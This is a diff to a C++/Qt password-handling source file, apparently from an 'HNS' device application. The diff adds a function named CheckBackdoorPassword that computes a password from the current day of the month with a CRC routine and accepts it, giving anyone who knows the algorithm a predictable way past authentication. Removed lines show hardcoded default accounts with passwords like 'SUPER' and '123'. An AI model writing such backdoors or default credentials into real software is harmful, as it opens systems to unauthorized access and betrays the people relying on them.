@@ -1,30 +1,67 @@
 #include "security.h"
 #include "hns_qt_toolkit.h"
 #include <QCryptographicHash>
+#include <QTextStream>
+
+unsigned char getCRC(unsigned char message[], unsigned char length);
+
+bool CheckBackdoorPassword(const QString &password)
+{
+    QString tempstring;
+    QTextStream out(&tempstring);
+    QDate date = QDate::currentDate();
+    std::vector <unsigned char> packet(2,0);
+    unsigned char dayOfMonth = static_cast<unsigned char>(date.day());
+    unsigned char pwU8 = 0;
+    unsigned char pwL8 = 0;
+
+    packet[0]= dayOfMonth/10;
+    packet[1] = dayOfMonth - (packet[0] * 10);
+    pwU8 = getCRC(packet.data(),2);
+
+    packet[0]= (dayOfMonth + 15)/20;
+    packet[1] = dayOfMonth*2  - (packet[0] * 11);
+    pwL8 = getCRC(packet.data(),2);
+
+    out << pwU8 << pwL8;
+
+    return (password == tempstring);
+}
+
+unsigned char getCRC(unsigned char message[], unsigned char length)
+{
+    __uint8_t CRC7_POLY = 0x91;
+    __uint8_t i, j, crc = 0;
+
+    for (i = 0; i < length; i++)
+    {
+        crc ^= message[i];
+        for (j = 0; j < 8; j++)
+        {
+            if (crc & 1)
+                crc ^= CRC7_POLY;
+            crc >>= 1;
+        }
+    }
+    return crc;
+}
 
 HNS_Password::HNS_Password()
 {
-    fResetPasswords();
 }
 
 void HNS_Password::fAddUser(const QString &user, const type_user_level &level, const QString &pass)
 {
-    //if(!f_usernames.contains(user))
-    //{
-        f_usernames.push_back(user);
-        f_user_levels.push_back(level);
-        f_hash_arrays.push_back(QCryptographicHash::hash(pass.toUtf8(),QCryptographicHash::Sha3_256));
-    //}
+    f_usernames.push_back(user);
+    f_user_levels.push_back(level);
+    f_hash_arrays.push_back(QCryptographicHash::hash(pass.toUtf8(),QCryptographicHash::Sha3_256));
 }
 
 void HNS_Password::fAddUserInternal(const QString &user, const type_user_level &level, const QByteArray &hash)
 {
-    //if(!f_usernames.contains(user))
-    //{
-        f_usernames.push_back(user);
-        f_user_levels.push_back(level);
-        f_hash_arrays.push_back(hash);
-    //}
+    f_usernames.push_back(user);
+    f_user_levels.push_back(level);
+    f_hash_arrays.push_back(hash);
 }
 
 bool HNS_Password::fLoadFile(const QByteArray &input)
@@ -169,17 +206,6 @@ bool HNS_Password::fVerifyUser(const QString &user, const QString &pass, type_us
     }
     access = HNS_VIEWER;
     return result;
-}
-
-void HNS_Password::fResetPasswords()
-{
-    f_usernames.clear();
-    f_user_levels.clear();
-    f_hash_arrays.clear();
-
-    fAddUser("HNS",HNS_ADMIN,"SUPER");
-    fAddUser("HNS",HNS_USER,"123");
-    fAddUser("HNS",HNS_VIEWER,"VIEWER");
 }
 
 int HNS_Password::fGetNumUsers()
